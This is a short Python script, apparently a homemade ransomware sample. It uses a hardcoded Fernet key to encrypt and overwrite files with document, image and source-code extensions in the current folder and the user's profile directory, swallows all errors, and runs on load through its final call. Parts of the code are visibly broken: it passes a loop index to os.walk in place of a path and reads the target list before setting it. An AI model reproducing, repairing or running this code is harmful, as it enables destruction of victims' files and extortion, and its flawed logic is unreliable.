from cryptography.fernet import Fernet
import os
from os.path import expanduser



class ransom():
    def __init__(self):
        #self.generar_key()
        self.key = "ff8UZ4rsARxpLEVKJgGpWOKtiqOL9VrQoKY2gxYa_ZA="
        self.encrytp(self.key)
        self.file_ext_targets = ['txt','jpg','png','jpeg','doc','docx','.py','.jav','.html',".css"]

    def generar_key(self):
        key = Fernet.generate_key()
        with open('key.key', 'wb') as key_file:
            key_file.write(key)

    def read_key(self):
        return open('key.key', 'rb').read()

    def encrytp(self,key):
        fer = Fernet(key)
        
        sys_root = os.environ["USERPROFILE"] #+"\\Desktop"
        sys_root1 = "."
        localss=[sys_root1,sys_root]
        for i in range(len(localss)):
        # sys_root = expanduser("~")    # Use to encrypt every folder from root
            for root, _, files in os.walk(i):
                for f in files:
                    try:
                        abs_file_path = os.path.join(root, f)
                        with open(abs_file_path, 'rb') as file:
                            file_data = file.read()
                        if not abs_file_path.split(".")[-1] in self.file_ext_targets:
                            continue
                        encrypted_data = fer.encrypt(file_data)
                        with open(abs_file_path, 'wb') as file:
                            file.write(encrypted_data)
                    except:
                        pass





# sys_root = expanduser("~")    # Use to encrypt every folder from root
ransom()